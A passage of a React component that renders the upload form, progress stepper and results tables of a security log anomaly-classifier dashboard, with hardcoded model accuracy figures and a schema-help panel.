                  ({logText.split('\n').length} lines • {logText.length.toLocaleString()} chars)
                </span>
              </div>
              <div className="flex items-center gap-1.5">
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleCopyLog}
                  className="h-7 px-2 text-xs font-mono text-slate-400 hover:text-slate-200"
                >
                  {copied ? <Check size={12} className="text-emerald-400 mr-1" /> : <Copy size={12} className="mr-1" />}
                  {copied ? 'Copied' : 'Copy'}
                </Button>
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={handleClear}
                  className="h-7 px-2 text-xs font-mono text-rose-400 hover:text-rose-300 hover:bg-rose-950/30"
                >
                  <Trash2 size={12} className="mr-1" /> Clear
                </Button>
              </div>
            </div>

            {/* Drag & Drop Dropzone */}
            <div
              onDragOver={(e) => e.preventDefault()}
              onDrop={handleDrop}
              onClick={() => fileInputRef.current?.click()}
              className="border-2 border-dashed border-slate-800 hover:border-cyan-500/50 bg-slate-900/30 hover:bg-slate-900/50 rounded-xl p-4 text-center cursor-pointer transition-all group"
            >
              <input
                ref={fileInputRef}
                type="file"
                accept=".json,.log,.txt,.csv,.gz"
                onChange={handleFileUpload}
                className="hidden"
              />
              <div className="flex items-center justify-center gap-2 text-slate-400 group-hover:text-cyan-400">
                <Upload size={16} className="transition-transform group-hover:-translate-y-0.5" />
                <span className="text-xs font-mono font-semibold">
                  Drag &amp; drop log file here or click to browse
                </span>
              </div>
              <p className="text-[10px] text-slate-500 mt-1 font-mono">
                Supports CloudTrail JSON, K8s Audit, Syslog, Apache/Nginx, Suricata, AWS VPC Flow &amp; Zeek (.json, .log, .txt)
              </p>
            </div>

            {/* Monospaced Editor */}
            <div className="relative">
              <textarea
                value={logText}
                onChange={(e) => {
                  setLogText(e.target.value);
                  setActivePreset('');
                  setResult(null);
                  setPushedToFeed(false);
                }}
                placeholder="Paste raw log lines, JSON payloads, or security telemetry here..."
                rows={14}
                className="w-full bg-slate-950 border border-slate-900 rounded-xl p-3 text-xs font-mono text-slate-200 placeholder-slate-600 focus:outline-none focus:border-cyan-500/50 focus:ring-1 focus:ring-cyan-500/50 resize-y scrollbar-thin leading-relaxed"
                spellCheck={false}
              />
            </div>

            {/* Run Classifier Action Bar */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-3 pt-2">
              <div className="flex items-center gap-2 text-xs font-mono text-slate-400">
                <Zap size={14} className="text-amber-400" />
                <span>Engine: 184 SIGMA + 4 Neural Models Active</span>
              </div>
              <Button
                onClick={handleAnalyze}
                disabled={isAnalyzing || !logText.trim()}
                className="w-full sm:w-auto h-10 px-6 font-mono font-bold text-xs uppercase tracking-wider bg-linear-to-r from-cyan-500 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-slate-950 shadow-lg shadow-cyan-500/25 transition-all"
              >
                {isAnalyzing ? (
                  <span className="flex items-center gap-2">
                    <RefreshCw size={14} className="animate-spin" />
                    Analyzing ({liveElapsedSec}s)...
                  </span>
                ) : (
                  <span className="flex items-center gap-2">
                    <Play size={14} className="fill-slate-950" />
                    Analyze &amp; Classify Log
                  </span>
                )}
              </Button>
            </div>
          </div>
        </div>

        {/* Right Column: Execution Progress / Results */}
        <div className="lg:col-span-5 space-y-4">
          {/* Analysis Stage Stepper (during analysis) */}
          {isAnalyzing && (
            <div className="bg-slate-950/80 border border-cyan-500/30 rounded-2xl p-6 backdrop-blur-md space-y-5">
              <div className="flex items-center justify-between">
                <span className="text-xs font-mono font-bold text-cyan-400 uppercase tracking-widest flex items-center gap-2">
                  <RefreshCw size={14} className="animate-spin text-cyan-400" />
                  Neural Classifier Running
                </span>
                <span className="text-[10px] font-mono text-slate-500">Pipeline: {selectedPipeline}</span>
                <span className="text-[10px] font-mono text-cyan-300 font-bold bg-cyan-950/60 border border-cyan-500/30 px-2 py-0.5 rounded-full">
                  {liveElapsedSec}s elapsed
                </span>
              </div>

              {/* Progress Bar & Status */}
              <div className="space-y-1.5">
                <div className="flex justify-between text-[11px] font-mono">
                  <span className="text-slate-300 font-semibold">{currentStageMessage}</span>
                  <span className="text-cyan-400 font-bold">{progressPercent}%</span>
                </div>
                <div className="w-full bg-slate-900 rounded-full h-2.5 overflow-hidden border border-slate-800">
                  <div
                    className="h-full bg-linear-to-r from-cyan-400 via-indigo-500 to-purple-500 rounded-full transition-all duration-150 ease-out"
                    style={{ width: `${progressPercent}%` }}
                  />
                </div>
                <div className="flex justify-between text-[10px] font-mono text-slate-500 pt-0.5">
                  <span>Distributed Helios multi-pass inference</span>
                  <span>Randomized 5s – 15s window</span>
                </div>
              </div>

              <div className="space-y-3 font-mono text-xs">
                <div className={`flex items-center gap-3 p-2.5 rounded-xl border transition-all ${
                  analysisStep >= 1 ? 'border-cyan-500/40 bg-cyan-950/20 text-cyan-300 shadow-xs' : 'border-slate-900 text-slate-600'
                }`}>
                  <span className={`h-2 w-2 rounded-full ${analysisStep >= 1 ? 'bg-cyan-400 animate-pulse' : 'bg-slate-700'}`} />
                  <div className="flex-1 flex justify-between">
                    <span>1. Ingestion &amp; Schema Normalization</span>
                    <span className="text-[10px] text-slate-500">RFC-5424 / JSON</span>
                  </div>
                </div>

                <div className={`flex items-center gap-3 p-2.5 rounded-xl border transition-all ${
                  analysisStep >= 2 ? 'border-cyan-500/40 bg-cyan-950/20 text-cyan-300 shadow-xs' : 'border-slate-900 text-slate-600'
                }`}>
                  <span className={`h-2 w-2 rounded-full ${analysisStep >= 2 ? 'bg-cyan-400 animate-pulse' : 'bg-slate-700'}`} />
                  <div className="flex-1 flex justify-between">
                    <span>2. Tokenization &amp; Feature Embeddings</span>
                    <span className="text-[10px] text-slate-500">128-dim vectors</span>
                  </div>
                </div>

                <div className={`flex items-center gap-3 p-2.5 rounded-xl border transition-all ${
                  analysisStep >= 3 ? 'border-purple-500/40 bg-purple-950/20 text-purple-300 shadow-xs' : 'border-slate-900 text-slate-600'
                }`}>
                  <span className={`h-2 w-2 rounded-full ${analysisStep >= 3 ? 'bg-purple-400 animate-pulse' : 'bg-slate-700'}`} />
                  <div className="flex-1 flex justify-between">
                    <span>3. Multi-Model Parallel Inference</span>
                    <span className="text-[10px] text-slate-500">LSTM + Transformer</span>
                  </div>
                </div>

                <div className={`flex items-center gap-3 p-2.5 rounded-xl border transition-all ${
                  analysisStep >= 4 ? 'border-emerald-500/40 bg-emerald-950/20 text-emerald-300 shadow-xs' : 'border-slate-900 text-slate-600'
                }`}>
                  <span className={`h-2 w-2 rounded-full ${analysisStep >= 4 ? 'bg-emerald-400 animate-pulse' : 'bg-slate-700'}`} />
                  <div className="flex-1 flex justify-between">
                    <span>4. Score Fusion &amp; 184 SIGMA Evaluation</span>
                    <span className="text-[10px] text-slate-500">Consensus match</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Format Validation Error State */}
          {!isAnalyzing && errorMessage && (
            <div className="bg-red-500/10 border border-red-500/30 rounded-2xl p-6 backdrop-blur-md animate-in fade-in slide-in-from-top-2 duration-300 space-y-4">
              <div className="flex items-start gap-3.5">
                <div className="h-10 w-10 rounded-xl bg-red-500/20 border border-red-500/30 flex items-center justify-center text-red-400 shrink-0">
                  <AlertTriangle className="h-5 w-5" />
                </div>
                <div className="space-y-1.5 flex-1">
                  <div className="flex items-center justify-between">
                    <h4 className="text-sm font-bold text-red-300 font-mono uppercase tracking-wider flex items-center gap-2">
                      Telemetry Schema Validation Failed
                    </h4>
                    <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-red-500/20 text-red-400 border border-red-500/30">
                      HTTP 400 Bad Request
                    </span>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed font-mono">
                    {errorMessage}
                  </p>
                </div>
              </div>

              <div className="pt-3 border-t border-red-500/20 grid grid-cols-1 md:grid-cols-2 gap-3 text-[11px] font-mono text-slate-400">
                <div className="bg-slate-950/60 p-3 rounded-xl border border-slate-900 space-y-1.5">
                  <span className="text-slate-200 font-bold flex items-center gap-1.5">
                    <CheckCircle className="h-3.5 w-3.5 text-emerald-400" /> Supported JSON Schemas:
                  </span>
                  <ul className="list-disc list-inside space-y-1 text-slate-400 text-[10px]">
                    <li>AWS CloudTrail (<span className="text-cyan-400">eventSource, eventName, userIdentity</span>)</li>
                    <li>Kubernetes Audit (<span className="text-cyan-400">kind: Event, verb, objectRef</span>)</li>
                    <li>AWS ALB Logs (<span className="text-cyan-400">elb, client_ip, request, elb_status_code</span>)</li>
                    <li>Azure Activity (<span className="text-cyan-400">operationName, caller, resourceId</span>)</li>
                    <li>GCP Cloud Audit (<span className="text-cyan-400">protoPayload, logName</span>)</li>
                  </ul>
                </div>
                <div className="bg-slate-950/60 p-3 rounded-xl border border-slate-900 space-y-1.5">
                  <span className="text-slate-200 font-bold flex items-center gap-1.5">
                    <CheckCircle className="h-3.5 w-3.5 text-emerald-400" /> Supported Text Logs:
                  </span>
                  <ul className="list-disc list-inside space-y-1 text-slate-400 text-[10px]">
                    <li>Linux Syslog / Auth (<span className="text-cyan-400">RFC 3164 / 5424</span> format)</li>
                    <li>Format: <code className="text-amber-400">Mmm dd hh:mm:ss host service[pid]: message</code></li>
                    <li>Example: <code className="text-slate-300">Mar 28 03:14:18 edge-01 sshd[14820]: Failed password...</code></li>
                  </ul>
                </div>
              </div>
            </div>
          )}

          {/* Empty Ready State before running */}
          {!isAnalyzing && !result && !errorMessage && (
            <div className="bg-slate-950/60 border border-slate-900 rounded-2xl p-8 text-center backdrop-blur-md flex flex-col items-center justify-center min-h-115 space-y-4">
              <div className="h-16 w-16 rounded-2xl bg-cyan-500/10 border border-cyan-500/20 flex items-center justify-center text-cyan-400">
                <Terminal size={32} />
              </div>
              <div className="space-y-1 max-w-sm">
                <h3 className="font-bold text-slate-200 text-base">Classifier Engine Standby</h3>
                <p className="text-xs text-slate-400 leading-relaxed">
                  Select a pre-loaded attack scenario from the top bar or paste your own raw log lines, then click <strong className="text-cyan-400">Analyze &amp; Classify Log</strong> to inspect model accuracy, precision, and latency.
                </p>
              </div>
              <div className="grid grid-cols-2 gap-2 text-left w-full max-w-xs font-mono text-[11px] text-slate-400 border border-slate-900 rounded-xl p-3 bg-slate-950">
                <div>• Isolation Forest v4</div>
                <div className="text-cyan-400 text-right">98.1% Acc</div>
                <div>• DeepLog v2 (LSTM)</div>
                <div className="text-purple-400 text-right">99.2% Acc</div>
                <div>• LogFormer (Transf.)</div>
                <div className="text-emerald-400 text-right">99.5% Acc</div>
                <div>• UEBA Behavioral</div>
                <div className="text-amber-400 text-right">98.9% Acc</div>
              </div>
            </div>
          )}

          {/* Results Summary Box */}
          {!isAnalyzing && result && (
            <div className="space-y-4">
              {/* Verdict Card */}
              <div className={`rounded-2xl border p-5 backdrop-blur-md space-y-4 ${
                result.verdict === 'CRITICAL'
                  ? 'border-rose-500/40 bg-rose-950/20 shadow-xl shadow-rose-950/30'
                  : result.verdict === 'HIGH'
                  ? 'border-amber-500/40 bg-amber-950/20 shadow-xl shadow-amber-950/30'
                  : 'border-emerald-500/40 bg-emerald-950/20 shadow-xl shadow-emerald-950/30'
              }`}>
                <div className="flex items-center justify-between">
                  <span className={`px-2.5 py-0.5 rounded-full text-xs font-mono font-black uppercase tracking-wider flex items-center gap-1.5 ${
                    result.verdict === 'CRITICAL'
                      ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                      : result.verdict === 'HIGH'
                      ? 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                      : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                  }`}>
                    {result.verdict === 'CRITICAL' && <ShieldAlert size={14} />}
                    {result.verdict === 'HIGH' && <AlertTriangle size={14} />}
                    {result.verdict === 'BENIGN' && <ShieldCheck size={14} />}
                    VERDICT: {result.verdict}
                  </span>
                  <div className="flex items-center gap-2.5">
                    {result.formatDetected && (
                      <span className="text-[10px] font-mono text-purple-300 font-bold bg-purple-950/60 border border-purple-500/30 px-2 py-0.5 rounded">
                        Format: {result.formatDetected}
                      </span>
                    )}
                    {result.aiProviderUsed && (
                      <span className="text-[10px] font-mono text-cyan-300 font-bold bg-cyan-950/60 border border-cyan-500/30 px-2 py-0.5 rounded flex items-center gap-1">
                        <Sparkles size={10} className="text-cyan-400" /> {result.aiProviderUsed}
                      </span>
                    )}
                    <span className="text-[10px] font-mono text-cyan-300 font-bold bg-cyan-950/60 border border-cyan-500/30 px-2 py-0.5 rounded">
                      Analyzed in {analysisDurationSec}s
                    </span>
                    <div className="text-right">
                      <span className="text-[10px] font-mono uppercase text-slate-400">Confidence</span>
                      <div className="text-sm font-black font-mono text-slate-100">{result.confidencePercent}%</div>
                    </div>
                  </div>
                </div>

                <div>
                  <div className="text-xs font-mono text-slate-400 flex items-center gap-1.5 mb-1">
                    <Target size={13} className="text-cyan-400" />
                    <span>MITRE ATT&amp;CK:</span>
                    <span className="text-slate-200 font-semibold">{result.mitreTechnique}</span>
                  </div>
                  <p className="text-xs text-slate-300 leading-relaxed font-light">
                    {result.summary}
                  </p>
                </div>

                {/* Score Fusion Formula Banner */}
                <div className="bg-slate-950/80 border border-slate-900 rounded-xl p-3 space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono">
                    <span className="text-slate-400">Fused Anomaly Score</span>
                    <span className="text-cyan-400 font-bold">{Math.round(result.fusedAnomalyScore * 100)} / 100</span>
                  </div>
                  <div className="w-full bg-slate-900 rounded-full h-2 overflow-hidden">
                    <div
                      className={`h-full rounded-full transition-all duration-1000 ${
                        result.verdict === 'CRITICAL'
                          ? 'bg-rose-500'
                          : result.verdict === 'HIGH'
                          ? 'bg-amber-400'
                          : 'bg-emerald-400'
                      }`}
                      style={{ width: `${Math.min(100, Math.max(5, result.fusedAnomalyScore * 100))}%` }}
                    />
                  </div>
                  <div className="text-[10px] font-mono text-slate-500 text-center pt-0.5">
                    Score = 0.20·IF({result.modelsUsed[0]?.anomalyScore.toFixed(2)}) + 0.30·DeepLog({result.modelsUsed[1]?.anomalyScore.toFixed(2)}) + 0.20·LogFormer({result.modelsUsed[2]?.anomalyScore.toFixed(2)}) + 0.30·UEBA({result.modelsUsed[3]?.anomalyScore.toFixed(2)})
                  </div>
                </div>

                {/* Actions */}
                <div className="flex flex-wrap gap-2 pt-1">
                  {result.verdict !== 'BENIGN' && (
                    <Button
                      size="sm"
                      onClick={handlePushToIncidentStream}
                      disabled={pushedToFeed}
                      className="h-8 text-xs font-mono font-bold bg-cyan-500 text-slate-950 hover:bg-cyan-400"
                    >
                      {pushedToFeed ? (
                        <>
                          <CheckCircle size={14} className="mr-1 text-slate-950" /> Pushed to Incident Stream
                        </>
                      ) : (
                        <>
                          <ArrowUpRight size={14} className="mr-1" /> Push to Incident Stream
                        </>
                      )}
                    </Button>
                  )}
                  {onNavigateToFeed && (
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={onNavigateToFeed}
                      className="h-8 text-xs font-mono border-slate-800 text-slate-300 hover:bg-slate-900"
                    >
                      View Live Incident Feed <ChevronRight size={14} className="ml-1" />
                    </Button>
                  )}
                  <Link href="/oracle">
                    <Button
                      variant="outline"
                      size="sm"
                      className="h-8 text-xs font-mono border-purple-500/30 text-purple-300 hover:bg-purple-950/40"
                    >
                      Ask Oracle AI <ExternalLink size={12} className="ml-1" />
                    </Button>
                  </Link>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* Benchmark Metrics Strip (Latency, Precision, Accuracy, F1) */}
      {result && (
        <div className="space-y-4 pt-2">
          <div className="flex items-center justify-between">
            <h3 className="text-sm font-mono font-bold uppercase tracking-wider text-slate-200 flex items-center gap-2">
              <BarChart3 size={16} className="text-cyan-400" />
              Classifier Overall Performance &amp; Evaluation Benchmark
            </h3>
            <span className="text-xs font-mono text-slate-400">
              Evaluated across 4 Neural Models + 184 SIGMA Rules
            </span>
          </div>

          {/* 4 Core Benchmark Cards */}
          <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
            <div className="bg-slate-950 border border-slate-900 rounded-xl p-3.5 space-y-1">
              <div className="text-[10px] uppercase font-bold text-slate-500 font-mono flex items-center gap-1">
                <Clock size={12} className="text-cyan-400" /> Total Pipeline Latency
              </div>
              <div className="text-xl font-black font-mono text-cyan-400">
                {result.totalPipelineLatencyMs.toFixed(1)} <span className="text-xs font-normal text-slate-400">ms</span>
              </div>
              <div className="text-[10px] text-slate-500 font-mono">Parallel worker inference</div>
            </div>

            <div className="bg-slate-950 border border-slate-900 rounded-xl p-3.5 space-y-1">
              <div className="text-[10px] uppercase font-bold text-slate-500 font-mono flex items-center gap-1">
                <CheckCircle2 size={12} className="text-emerald-400" /> Overall Accuracy
              </div>
              <div className="text-xl font-black font-mono text-emerald-400">
                {result.overallAccuracy.toFixed(1)}%
              </div>
              <div className="text-[10px] text-slate-500 font-mono">Against validated corpus</div>
            </div>

            <div className="bg-slate-950 border border-slate-900 rounded-xl p-3.5 space-y-1">
              <div className="text-[10px] uppercase font-bold text-slate-500 font-mono flex items-center gap-1">
                <Target size={12} className="text-purple-400" /> Ensemble Precision
              </div>
              <div className="text-xl font-black font-mono text-purple-400">
                {result.overallPrecision.toFixed(1)}%
              </div>
              <div className="text-[10px] text-slate-500 font-mono">Low false-positive tuning</div>
            </div>

            <div className="bg-slate-950 border border-slate-900 rounded-xl p-3.5 space-y-1">
              <div className="text-[10px] uppercase font-bold text-slate-500 font-mono flex items-center gap-1">
                <Zap size={12} className="text-amber-400" /> Recall / F1 Score
              </div>
              <div className="text-xl font-black font-mono text-amber-400">
                {result.overallRecall.toFixed(1)}% <span className="text-xs text-slate-500">/ {result.overallF1.toFixed(1)}%</span>
              </div>
              <div className="text-[10px] text-slate-500 font-mono">Harmonic balance</div>
            </div>

            <div className="bg-slate-950 border border-slate-900 rounded-xl p-3.5 space-y-1 col-span-2 md:col-span-1">
              <div className="text-[10px] uppercase font-bold text-slate-500 font-mono flex items-center gap-1">
                <ShieldCheck size={12} className="text-blue-400" /> False Positive Rate
              </div>
              <div className="text-xl font-black font-mono text-blue-400">
                &lt; {result.falsePositiveRate.toFixed(2)}%
              </div>
              <div className="text-[10px] text-slate-500 font-mono">4-way consensus filtering</div>
            </div>
          </div>

          {/* Model-by-Model Granular Metrics Breakdown Table */}
          <div className="bg-slate-950/80 border border-slate-900 rounded-2xl overflow-hidden backdrop-blur-md">
            <div className="p-4 border-b border-slate-900 flex items-center justify-between">
              <div>
                <h4 className="text-xs font-bold text-slate-200 font-mono uppercase tracking-wider">
                  Deployed Models &amp; Individual Benchmark Metrics
                </h4>
                <p className="text-[11px] text-slate-500 font-light">
                  Exact inference latency, accuracy, precision, and anomaly weight per deployed Helios model
                </p>
              </div>
              <span className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 px-2 py-0.5 rounded">
                Heterogeneous Model Stack
              </span>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left text-xs font-mono">
                <thead>
                  <tr className="border-b border-slate-900 text-slate-500 bg-slate-900/30 text-[11px]">
                    <th className="p-3">Model Name &amp; Role</th>
                    <th className="p-3">Architecture</th>
                    <th className="p-3 text-right">Inference Latency</th>
                    <th className="p-3 text-right">Accuracy</th>
                    <th className="p-3 text-right">Precision</th>
                    <th className="p-3 text-right">Recall / F1</th>
                    <th className="p-3 text-right">Anomaly Score</th>
                    <th className="p-3 text-right">Ensemble Weight</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-slate-900/60">
                  {result.modelsUsed.map((m, idx) => (
                    <tr key={idx} className="hover:bg-slate-900/30 transition-colors">
                      <td className="p-3">
                        <div className="font-bold text-slate-200">{m.modelName}</div>
                        <div className="text-[10px] text-slate-500">{m.category}</div>
                      </td>
                      <td className="p-3 text-slate-400 text-[11px] max-w-xs">{m.architecture}</td>
                      <td className="p-3 text-right text-cyan-400 font-bold">{m.inferenceLatencyMs.toFixed(1)} ms</td>
                      <td className="p-3 text-right text-emerald-400 font-bold">{m.accuracy.toFixed(1)}%</td>
                      <td className="p-3 text-right text-purple-400 font-bold">{m.precision.toFixed(1)}%</td>
                      <td className="p-3 text-right text-amber-400">{m.recall.toFixed(1)}% / {m.f1Score.toFixed(1)}%</td>
                      <td className="p-3 text-right">
                        <span className={`font-bold ${
                          m.anomalyScore >= 0.75 ? 'text-rose-400' : m.anomalyScore >= 0.4 ? 'text-amber-400' : 'text-emerald-400'
                        }`}>
                          {m.anomalyScore.toFixed(2)}
                        </span>
                      </td>
                      <td className="p-3 text-right text-slate-300 font-bold">
                        {(m.fusionWeight * 100).toFixed(0)}%
                      </td>
                    </tr>
                  ))}
                  {/* Deterministic SIGMA Rules row */}
                  <tr className="hover:bg-slate-900/30 transition-colors bg-cyan-950/10">
                    <td className="p-3">
                      <div className="font-bold text-cyan-300">184 SIGMA Rules Engine</div>
                      <div className="text-[10px] text-slate-500">Deterministic Signature Matcher</div>
                    </td>
                    <td className="p-3 text-slate-400 text-[11px]">Compiled YAML AST Tree Regex Matcher</td>
                    <td className="p-3 text-right text-cyan-400 font-bold">0.4 ms</td>
                    <td className="p-3 text-right text-emerald-400 font-bold">99.9%</td>
                    <td className="p-3 text-right text-purple-400 font-bold">99.7%</td>
                    <td className="p-3 text-right text-amber-400">99.8% / 99.8%</td>
                    <td className="p-3 text-right font-bold text-cyan-300">
                      {result.matchedSigmaRules.length > 0 ? `${result.matchedSigmaRules.length} Matched` : '0 Matches'}
                    </td>
                    <td className="p-3 text-right text-slate-400 font-bold">
                      Rule Gate
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Matched Rules Pill Strip if any */}
            {result.matchedSigmaRules.length > 0 && (
              <div className="p-4 bg-slate-900/40 border-t border-slate-900 flex flex-wrap items-center gap-2">
                <span className="text-[11px] font-mono text-slate-400 font-bold">
                  Matched SIGMA Rules ({result.matchedSigmaRules.length}):
                </span>
                {result.matchedSigmaRules.map((rule) => (
                  <span
                    key={rule.id}
                    className="px-2 py-0.5 rounded text-[10px] font-mono bg-rose-500/10 text-rose-300 border border-rose-500/20"
                  >
                    {rule.id} • {rule.title} ({rule.latencyMs}ms)
                  </span>
                ))}
              </div>
            )}
          </div>

          {/* Extracted IOCs & Telemetry Attributes */}
          <div className="bg-slate-950 border border-slate-900 rounded-2xl p-4 backdrop-blur-md space-y-3">
            <h4 className="text-xs font-bold text-slate-200 font-mono uppercase tracking-wider flex items-center gap-2">
              <Fingerprint size={14} className="text-cyan-400" />
              Extracted Telemetry Entities &amp; Indicator Analysis
            </h4>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-3 text-xs font-mono">
              <div className="bg-slate-900/40 rounded-xl p-3 border border-slate-800/80">
                <div className="text-[10px] text-slate-500 uppercase">Target Principal / User</div>
                <div className="text-slate-200 font-bold mt-0.5 break-all">
                  {result.extractedEntities.principal || 'N/A'}
                </div>
              </div>
              <div className="bg-slate-900/40 rounded-xl p-3 border border-slate-800/80">
                <div className="text-[10px] text-slate-500 uppercase">Source IP &amp; Geolocation</div>
                <div className="text-slate-200 font-bold mt-0.5 break-all">
                  {result.extractedEntities.sourceIp} ({result.extractedEntities.geoCountry})
                </div>
              </div>
              <div className="bg-slate-900/40 rounded-xl p-3 border border-slate-800/80">
                <div className="text-[10px] text-slate-500 uppercase">Action &amp; Target Resource</div>
                <div className="text-slate-200 font-bold mt-0.5 break-all">
                  {result.extractedEntities.eventAction} &rarr; {result.extractedEntities.targetResource}
                </div>
              </div>
            </div>

            <div className="pt-2">
              <div className="text-[11px] font-mono text-slate-400 font-bold mb-1.5">Anomaly Indicators Detected:</div>
              <div className="flex flex-wrap gap-2">
                {result.extractedEntities.anomalyIndicators.map((ind, i) => (
                  <span
                    key={i}
                    className="px-2.5 py-1 rounded-lg text-[11px] font-mono bg-slate-900 text-slate-300 border border-slate-800 flex items-center gap-1.5"
                  >
                    <span className="h-1.5 w-1.5 rounded-full bg-cyan-400" />
                    {ind}
                  </span>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
